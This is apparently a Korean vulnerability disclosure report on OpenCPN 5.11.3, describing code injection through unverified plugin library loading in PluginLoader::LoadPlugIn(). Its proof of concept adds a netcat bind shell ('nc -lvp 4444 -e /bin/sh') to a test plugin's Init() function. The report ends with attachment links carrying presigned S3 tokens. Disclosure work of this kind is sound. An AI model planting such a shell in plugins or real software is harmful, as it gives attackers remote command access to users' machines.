---
notion_url: https://www.notion.so/04dbe0809830835ea2c801a5a65a41d1
last_synced: 2026-06-12 00:59
tags: [notion-sync]
---

# [KOR] OpenCPN RCE - Code Injection

취약점 제목 : OpenCPN RCE - Code Injection
취약점 요약 : 서명, 경로, 화이트리스트 검증이 없는 동적 라이브러리 링크 파일을 load 함으로써 발생하는 Remote Code Execution
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Code Injection
영향 : 프로세스 권한의 Remote Code Execution
취약한 파일명 : plugin_loader.cpp
취약한 함수명 : PluginLoader::LoadPlugIn()
취약한 파라미터 : const wxString& plugin_file, PlugInContainer* pic
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Library를 로드하는 과정 중 검증과정이 블랙리스트 기반 검증밖에 없는것을 확인

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

깃허브에서 OpenCPN용 TestPlugin 템플릿을 받아와 예시 RCE로 바인드 쉘을 사용
https://github.com/jongough/testplugin_pi.git
`src/testplugin_pi.cpp` 의 `Init()` 최상단에 다음을 추가:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

빌드 후 OpenCPN 내부에서 Plugin을 Import 하면

![image](_assets/image.png)

nc 명령으로 쉘 접속 가능함을 알수 있습니다.

취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YCOROYLS%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T155931Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIAOYEjbN1L4XXWj9C8ynuWFH5cN6G97pJx6BGd4xBg72AiBClcLvezvtZMfFQ%2BUPeT7ouIXY%2B6TKi%2BOqAK0P5qBTaSqIBAj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMZmTBMY8sZzJrGmbvKtwD7KDH4Cl8iFxGQk%2FtySJjIGxJrg8Dr4oJy%2BigHLx0YYucxnBd%2FIUP%2BEkAjcv4Ww3MIMBl09SwO4P6e0qR8ylC%2Bd1E1zt5GvU8wkZG8H1jKz6EN9iVAfGnSfo3wazBGwop%2FHD80aPyN6Pcqt0kF8rlN4wd6%2FAZht7sJMJu26NzNZKeLnfdS1DW7%2Byul%2B3whmsXCnufKzEZrsDdX6E3lb6ZA4J0%2BJx5PdF0sdAGNziGhVDMRTvYX6zCbYysdkftPrl3lHNoHug%2FKtyLkNqbt7IJy5N3tHDocng2NWEakP6xsffZUtEKRfJP08z16Wm2bi6ytYhQqsMlzEHHo%2FTTYH0p%2Bw89JTMiYNIe4aoOsBbbOHu6EJE0BaTqwghZOul6yeZf6P6GLjJwwnWeYZJ7AsHJ8nCys3cqyGOSCrc9Azz7Raj6vXzuzxAdYOS3Ydv68IeU7bAv2h0E4ODgf4g%2Byv%2BRk2g3mWSmE7TF4GmU%2BPUfA6lDwV9%2FpFuqZmx3DuGZ1dGqg0BurPJ4MfulED27SXT5ChQKX8X68zBlrh7l9oZvEZUOGn%2B%2FBuLn%2FYsj4QygS8n1%2FHdF4fISwKCxKh4dzu0sV8knK2%2BqtTyKZcRS60Pg3op8sM3%2B3T5ynuVAE%2B0wlduq0QY6pgF1TXhHXiE53fmCMP3voeZRJ6EVhqi%2BppgnAh439IMo8SaDKRpICIKIbmbqM8rKAaRhWEqHD2JFV9tsXuuu1qAM%2Fc4OH4IyvHUwE5GUncwwJyEU2XX9UgZDgmEax9iIn%2FBIul1oXW1UEGkh4Ao6L8BtmH97YrVzgsy0YTO2WFkjctIm2Y0mLeuGMKQX6g%2B3pwyerCc19GzRfFYuNJrNCNXj6mx0OoQb&X-Amz-Signature=ccff1ca9a1d348255ab2803a0a01c518a8e5f6734088c32515a3109f49eba998&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)




> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/f9e232eb-7be1-4217-8bad-eca58c969748/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YCOROYLS%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T155931Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIAOYEjbN1L4XXWj9C8ynuWFH5cN6G97pJx6BGd4xBg72AiBClcLvezvtZMfFQ%2BUPeT7ouIXY%2B6TKi%2BOqAK0P5qBTaSqIBAj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMZmTBMY8sZzJrGmbvKtwD7KDH4Cl8iFxGQk%2FtySJjIGxJrg8Dr4oJy%2BigHLx0YYucxnBd%2FIUP%2BEkAjcv4Ww3MIMBl09SwO4P6e0qR8ylC%2Bd1E1zt5GvU8wkZG8H1jKz6EN9iVAfGnSfo3wazBGwop%2FHD80aPyN6Pcqt0kF8rlN4wd6%2FAZht7sJMJu26NzNZKeLnfdS1DW7%2Byul%2B3whmsXCnufKzEZrsDdX6E3lb6ZA4J0%2BJx5PdF0sdAGNziGhVDMRTvYX6zCbYysdkftPrl3lHNoHug%2FKtyLkNqbt7IJy5N3tHDocng2NWEakP6xsffZUtEKRfJP08z16Wm2bi6ytYhQqsMlzEHHo%2FTTYH0p%2Bw89JTMiYNIe4aoOsBbbOHu6EJE0BaTqwghZOul6yeZf6P6GLjJwwnWeYZJ7AsHJ8nCys3cqyGOSCrc9Azz7Raj6vXzuzxAdYOS3Ydv68IeU7bAv2h0E4ODgf4g%2Byv%2BRk2g3mWSmE7TF4GmU%2BPUfA6lDwV9%2FpFuqZmx3DuGZ1dGqg0BurPJ4MfulED27SXT5ChQKX8X68zBlrh7l9oZvEZUOGn%2B%2FBuLn%2FYsj4QygS8n1%2FHdF4fISwKCxKh4dzu0sV8knK2%2BqtTyKZcRS60Pg3op8sM3%2B3T5ynuVAE%2B0wlduq0QY6pgF1TXhHXiE53fmCMP3voeZRJ6EVhqi%2BppgnAh439IMo8SaDKRpICIKIbmbqM8rKAaRhWEqHD2JFV9tsXuuu1qAM%2Fc4OH4IyvHUwE5GUncwwJyEU2XX9UgZDgmEax9iIn%2FBIul1oXW1UEGkh4Ao6L8BtmH97YrVzgsy0YTO2WFkjctIm2Y0mLeuGMKQX6g%2B3pwyerCc19GzRfFYuNJrNCNXj6mx0OoQb&X-Amz-Signature=60104ee710767596443f1c72f5470016e7c21f3aa63bd94992f89163a1fb9ca0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
